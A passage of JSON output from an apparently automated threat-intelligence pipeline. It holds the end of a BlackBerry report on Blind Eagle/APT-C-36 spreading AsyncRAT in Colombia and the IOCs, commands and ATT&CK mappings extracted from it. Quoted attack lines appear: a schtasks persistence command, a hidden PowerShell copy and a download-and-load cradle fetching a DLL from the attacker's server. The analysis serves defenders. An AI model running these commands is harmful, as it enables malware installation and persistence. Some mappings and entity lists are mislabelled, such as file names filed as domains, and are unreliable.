payload) File Size 26080 bytes Compiled Sun May 10 05:24:51 2020   UTC AsyncRAT contains a configuration method with information that is used during the intrusion attempt. This information is encrypted usingBase64 and AES256. Figure 17: AsyncRAT configuration encrypted Once the configuration is decrypted  it contains information about the Command-and-Control (C2) to transfer commands and files betweenclient and server. 1 5 / 1 9 Figure 18: AsyncRAT configuration decrypted Also  between the configuration  it was possible to obtain the X.509 certificates used for communication with the C2. Figure 19: Certificate extracted from the AsyncRAT config AsyncRAT can establish persistence in two different ways  depending on whether a user loaded it with admin privileges or not. A copy of itselfis first created under C:\\Users\\ user \\AppData\\Roaming\\MRR.exe. Figure 20: Creation of MRR in AppData folder 1. If the user who executed it was an admin  then AsyncRAT can create a scheduled task using the process schtasks.exe  with the followingcommand line: a.  C:\\Windows\\System32\\cmd.exe  /c schtasks /create /f /sc onlogon /rl highest /tn  MRR  /tr   C:\\Users\\ user \\AppData\\Roaming\\MRR.exe     exit  Figure 21: Execution of schtasks.exe via cmd.exe Figure 22: Command line executed to create scheduled task and run AsyncRAT 2. If the user is not an admin  then AsyncRAT can create a registry key to execute the binary every time the system is started: 1 6 / 1 9 a. Key: KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MRRb. Value: C:\\Users\\ user \\AppData\\Roaming\\MRR.exe Figure 23: Registry key created to execute the AsyncRAT Payload An interesting part that always happens  regardless of whether the user is admin or not  is the creation of a .bat file in the user s Temp directoryto perform the following actions: a. Timeout.exe execution for three seconds b. Run the AsyncRAT payload from AppData folder c. Delete the .bat file Figure 24: tmp file creation in the Temp directory Figure 25: Execution of cmd.exe to load the .bat file from tmp folder We could determine that the .bat filename is randomly generated using the regular expression after several executions of this sample. Thestructure is like the next one: . tmp[a-zA-Z1-9]{4}.tmp.bat. 1 7 / 1 9 Figure 26: Persistence methods used by AsyncRAT Network Infrastructure In this case  the victim s machine starts communicating with the DuckDNS server to receive and execute commands  exfiltrate information and perform any other action desired by the threat actor. As seen in figure 18 above  the server used is asy1543.duckdns[.]org:1543. Figure 27: Communication started between victim s machine and the threat actor s C2 During our investigation  the resolution of the DuckDNS domain was changed to different IP addresses. Initially  the IP that resolves thedomain was a VPN/Proxy service 46.246.86[.]3. While conducting the investigation  we discovered another IP with the same purpose 46.246.12[.]6. EntityValue Description 1 8 / 1 9 Domainasy1543.duckdns[.]org:1543Final AsyncRAT payload communication domain IP 46.246.86[.]3 Resolution of the DuckDNS domain IP 46.246.12[.]6 Resolution of the DuckDNS domain URL hxxp://172.174.176[.]153/Web application hosting payloads used during the infection IP 172.174.176[.]153IP of the web application hosting payloads used during the infection Blind Eagle/ APT-C-36 uses Dynamic DNS (DDNS) services  such as DuckDNS  for most campaigns to connect its implemented RATs to theinfrastructure they control to send and receive commands. DuckDNS additionally allows for high IP resolution rotation and the launch of newsubdomains under this well-known DDNS The application web hosted under hxxp://172.174.176[.]153/ had two main directories where it stored information to be used during theintrusion as the user downloads and executes files. The first directory was hxxp://172.174.176[.]153/dll/  storing several DLLs used during the intrusion. Figure 28: Index of APT-C-36 s /dll directory Another directory is found at hxxp://172.174.176[.]153/rump/ and stores another DLL  in this case  related to Fsociety: Figure 29: index of /rump directory Targets Blind Eagle/ APT-C-36 s targets include health  public  financial  judiciary  and law enforcement entities in Colombia. Among the countries where we have seen Blind Eagle activity in the last few months  specifically distributing the UUE file types with differentthemes  include: 1 9 / 1 9 ColombiaEcuadorChileSpain This is consistent with the use of the Spanish language in the group s spear-phishing emails. Most countries in South America use Spanish(apart from Brazil)  which matches the threat actor s locale and the names in the bait document. Attribution APT-C-36 is a South American-based threat actor active since at least 2019. The group continues to concentrate its operations within aHispanic geographic region  with its main targets being government institutions and other organizations primarily based in Colombia. The use of specific tools and artifacts  along with the type and configuration of the network infrastructure documented in this report  combinedwith the tactics  techniques   procedures (TTPs) used to deploy them  all closely align with previously attributed campaigns by this group. That  coupled with the geolocation and nature of the targets seen in this campaign  leads us to ascertain  at the very least  a moderate level ofconfidence that this campaign was conducted by APT-C-36. Conclusions This campaign continues to operate for the purposes of information theft and espionage. The modus operandi used has mostly stayed the sameas the group s previous efforts   it is very simple  which may mean that this group is comfortable with its way of launching campaigns viaphishing emails  and feels confident in using them because they continue to work. Over the next few months  we will likely continue to see new targets for this group  using new ways to deceive their victims. APPENDIX 1 - Applied Countermeasures Yara Rules rule targeted_BlindEagle_Loader : Fsociety { meta: description    Rule to detect BlindEagle malicious Loader  author    The BlackBerry Research   Intelligence team  date    2023-02-07  last_modified    2023-02-22  distribution    TLP:White  version    1.0  strings: $h0  {6449640053697A655F00526573657276656431004465736B746F70005469746C65006477580064775900647758536 97A650064775953697A6500647758436F756E74436861727300647759436F756E74436861727300647746696C6C41747472} $h1  {000004200101022901002434353136453045312D354330452D344234452D394133322D39453337453233453734323600000C01000731 2E302E302E3000004901001A2E4E45544672616D65776F726B2C5665} condition: uint16(0)    0x5A4D and filesize   100KB and 1 of ($h ) } Disclaimer: The private version of this report is available upon request. It includes but is not limited to the complete and contextual MITREATT CK  mapping  MITRE D3FEND  countermeasures  and other threat detection content for tooling  network traffic  complete IOCs list and system behavior. Please email us at cti@blackberry.com for more information. About The BlackBerry Research   Intelligence Team The BlackBerry Research   Intelligence team examines emerging and persistent threats  providing intelligence analysis for the benefit ofdefenders and the organizations they serve.",
            "commands": [
              "Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad the Fsociety DLL into memory, passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique",
              "PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today.",
              "PowerShell execution",
              "schtasks /create /f /sc onlogon /rl highest /tn \"MRR\" /tr '\"C:\\Users\\<user>\\AppData\\Roaming\\MRR.exe\"' & exit'",
              "PowerShell execution.",
              "PowerShell command spawned by theVBS Script and calling the \u2018VAI\u2019 method.",
              "PowerShell\nAs mentioned, Fsociety.dll is used to load the final payload of AsyncRAT, which is downloaded from Discord.",
              "PowerShell\nAttack Vector Spear-phishing attachment with PDF",
              "powershell.exe\nNext, it uses GetType(\u2018Fiber.home\u2019).GetMethod(\u2018VAI\u2019), to load the VAI method from the DLL downloaded previously. The logic of this methodis as follows:",
              "PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam, which is a .NET DLLencoded, as shown in figure 12. "
            ],
            "file_paths": [
              "/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc/",
              "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad",
              "/172.174.176[.]153/dll/Dll.ppam,",
              "C:\\Windows\\System32\\cmd.exe",
              "/",
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "/172.174.176[.]153/rump/Rump.xls",
              "C:\\Users\\",
              "/cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002408-02-2023-pdf[.]uue",
              "/172.174.176[.]153/rump/",
              "/172.174.176[.]153/Web",
              "C:\\Windows\\Temp\\OneDrive.vbs",
              "/cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P0889903-02-2023-pdf[.]uuehxxps:/",
              "C:\\Windows\\Temp\\OneDrive.vbsDownload",
              "/172.174.176[.]153/dll/Dll.ppam'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null,",
              "/172.174.176[.]153/dll/,",
              "/www.dian.gov.co/.",
              "/cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt",
              "/172.174.176[.]153/",
              "/cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L208801-02-2023-pdf[.]uuehxxps:/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Loader",
              "Trojan",
              "apt",
              "conti",
              "payload",
              "rat",
              "remote access Trojan"
            ],
            "tools": [
              "NET",
              "PowerShell",
              "Sc",
              "at",
              "cmd",
              "ping",
              "reg",
              "schtasks",
              "wscript"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "01-02-2023-pdf.uue",
              "6440005403992837L2088970004-01-02-2023-pdf.vbs",
              "CurrentDomain.Load",
              "Dll.ppam",
              "Domainasy1543.duckdns",
              "Fiber.Home",
              "Fiber.dll",
              "Fiber.home",
              "Fsociety.dll",
              "Fv3608799004720042L900483000P19878099700001537012.pdf",
              "MRR.exe",
              "Microsoft.NET",
              "Net.WebClient",
              "OneDrive.vbs",
              "OneDrive.vbsDownload",
              "PowerShell.Powershell.exe",
              "RegSvcs.exe",
              "Rump.xls",
              "Stub.exe",
              "System.AppDomain",
              "Timeout.exe",
              "asy1543.duckdns",
              "blackberry.com",
              "blogs.blackberry.com",
              "ccb.org.co",
              "cdn.discordapp",
              "cmd.exe",
              "dian.server",
              "moc.ppadrocsid.ndc",
              "obligations.The",
              "powershell.exe",
              "schtasks.exe",
              "system.Convert",
              "tmp.bat",
              "txt.ysa",
              "wscript.exe",
              "www.dian.gov.co",
              "years.Although"
            ],
            "hashes": {
              "md5": [
                "07AF8778DE9F2BC53899AAC7AD671A72",
                "5E518B80C701E17259F3E7323EFFC83F",
                "6BEF68F58AFCFDD93943AFCC894F8740",
                "B432202CF7F00B4A4CBE377C284F3F28",
                "C75F9D3DA98E57B973077FDE8EC3780F"
              ],
              "sha256": [
                "03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5",
                "430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366",
                "5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC",
                "64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC",
                "6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "PowerShell",
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Registry Run Keys",
              "Scheduled Task/Job",
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "**Observed Commands:**\n- Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad the Fsociety DLL into memory, passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique\n- PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today.\n- PowerShell execution\n- schtasks /create /f /sc onlogon /rl highest /tn \"MRR\" /tr '\"C:\\Users\\<user>\\AppData\\Roaming\\MRR.exe\"' & exit'\n- PowerShell execution.\n\n**File System Activity:**\n- /3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc/\n- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad\n- /172.174.176[.]153/dll/Dll.ppam,\n- C:\\Windows\\System32\\cmd.exe\n- /\n\n**Network Indicators:**\n- Timeout.exe\n- wscript.exe\n- cdn.discordapp\n- Stub.exe\n- blogs.blackberry.com\n- Net.WebClient\n- Domainasy1543.duckdns\n- OneDrive.vbsDownload\n- moc.ppadrocsid.ndc\n- txt.ysa\n\n**Key Security Terms:** establish, privilege, installation, payload, extract, command-and-control, task, persistence, evasion, execute"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 16.733999999999998,
          "llm_processing_time_ms": 5010.329
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "extracted_ttps": [
          {
            "ttp_id": "62c39b6f-13ca-4c4c-aff5-248f8fb99c08",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Execution",
            "attack_id": "T1204.001",
            "tactic": "Execution",
            "description": "Threat actor used .NET Assemblies injected in memory to execute malicious code",
            "confidence_score": 0.728,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.314,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".NET Assemblies",
              "memory injection"
            ],
            "tools": [
              "at",
              ".NET Assemblies",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "23a41002-3566-4552-a48c-5e948df3977a",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Persistence",
            "attack_id": "T1053.005",
            "tactic": "Persistence",
            "description": "Threat actor used malicious DLLs to maintain persistence on the target system",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious DLLs"
            ],
            "tools": [
              "at",
              "DLLs",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8929a83e-253c-4e05-9876-a0f4976bfd89",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Threat actor used PowerShell to execute malicious commands",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d19cea20-d8fe-4405-ac1e-2b7e008eac57",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Spearphishing Attachment",
            "attack_id": "T1566.001",
            "tactic": "Initial Access",
            "description": "Threat actor sent spear-phishing emails with PDF attachments to target key industries in Colombia",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.74,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "e4d2799f3001a531d15939b1898399b4",
              "fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554",
              "Fv3608799004720042L900483000P19878099700001537012.pdf",
              "correspondencia@ccb.org.co",
              "alfredo agudelo moreno agudelomorenoalfredo79@gmail.com",
              "cobrofactura09291@gmail.com"
            ],
            "tools": [
              "PDF",
              "at",
              ".NET Assemblies",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "Visual Basic Scripts",
              "Sc",
              "apt",
              "NET",
              "base64",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "99f9005b-fcf9-4cc2-ac4d-7e8a01b3df21",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d7d1f07d-0a77-4a9c-9564-68748ec64e04",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "13fce22c-c586-4d8a-88b6-64d003b35e6e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Defense Evasion",
            "attack_id": "T1218.009",
            "tactic": "Defense Evasion",
            "description": "Threat actor used URL phishing to evade detection",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "URL phishing",
              "dian.server.tl"
            ],
            "tools": [
              "URL phishing",
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "Sc",
              "apt",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5e5670ea-b3e1-4acf-ae63-0853023892c8",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Threat actor created or modified system processes to maintain persistence",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system process"
            ],
            "tools": [
              "at",
              "system process",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "838d9af0-1b6b-483e-8756-7e3486c57af6",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "User Execution",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Threat actor used user execution to run malicious code",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "user execution"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "cmd",
              "ping",
              "powershell",
              "schtasks",
              "user execution"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "07c7153e-5d52-4994-bc7f-2246fd0cb77c",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5bb30b32-ec10-458c-9fd4-30a8fedbec82",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Threat actor used cmd to execute malicious commands",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ed223d70-a172-477f-a2d2-5b9c6d98bfdb",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Scripting",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "Threat actor used scripting to execute malicious code",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "scripting"
            ],
            "tools": [
              "at",
              "rar",
              "scripting",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b1633ea2-b32d-486a-bd3b-7c7ec4957134",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Scripting",
            "attack_id": "T1059.005",
            "tactic": "Execution",
            "description": "Threat actor used scripting to execute malicious code",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "scripting"
            ],
            "tools": [
              "at",
              "rar",
              "scripting",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "37050cc2-2204-47e0-9c8c-870169b9d539",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "edaa49f4-338e-4e1e-84a9-0277f6be6c8e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "7d06ad88-10d7-48ef-9438-306f28ea2c83",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8c4cd654-c409-4bd7-b3b0-2da0720380c1",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "777bc657-f4c8-49cb-a91e-de40b7aaa907",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a219344b-802d-4623-a59e-e2e923443f5e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "56aa6692-fe18-4de1-84e4-259f06e734a5",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
